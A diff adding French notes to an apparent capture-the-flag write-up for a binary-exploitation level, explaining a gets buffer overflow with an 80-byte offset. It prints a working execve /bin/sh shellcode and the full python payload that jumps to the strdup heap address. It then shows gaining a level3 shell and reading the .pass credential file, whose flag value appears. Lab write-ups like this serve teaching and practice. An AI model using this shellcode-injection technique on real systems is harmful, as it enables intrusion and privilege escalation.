@@ -3,3 +3,47 @@
 mettre du shellcode dans le buffer, mettre un l'address du debut de la heap a la fin
 
 pour recuperer l'addr, prendre registre eax apres strdup
+
+Pour commencer on fait un objdump sur le binaire et on voit
+que le main fait appel a une fonction p qui elle fait appelle 
+a gets et duplique sur la string sur la sortie standard
+
+Nous avons donc encore a faire a un buffer overflow sauf que 
+cette fois le retour de gets est protegé donc impossible de 
+refaire la meme technique qu'au niveau precedent
+
+Après quelque recherche, je decouvre que nous allons devoir faire
+une shellcode injection
+
+Cela consiste a remplir le buffer avec des instruction en shellcode
+et de faire pointer eip sur le debut de celui ci, pour cela nous allons
+exploiter le retour de strdup via eax (registre de retour)
+
+on determine donc d'abord la taille du buffer grace au site du niveau
+precedent et gdb, on trouve Offset: 80
+
+on sait donc que l'on doit remplir notre buffer avec 80 caracteres
+
+un shellcode est une serie d'instruction assembleur ecrite en hexa.
+On pourrait en construire un nous meme mais il y en a beaucoup de 
+disponible sur internet. je choisis donc d'utiliser celui trouvable ici
+https://dhavalkapil.com/blogs/Shellcode-Injection/ qui permet d'ouvrir
+/bin/sh :
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+ce shellcode fait 25 octets donc il nous faut le completer avec 55 octets
+
+python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'a' * 55 + '\x08\x04\x84\xcf'[::-1])" > /tmp/xxxx
+
+comme lors du level precedent on cat le fichier puis on reutilise cat pour garder
+stdin ouvert
+
+(cat /tmp/xxxx; cat) | ./level2
+>> whoami
+<< level3 
+
+il ne reste plus qu'a recuperer le pass
+
+>> cat /home/user/level3/.pass
+<< 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
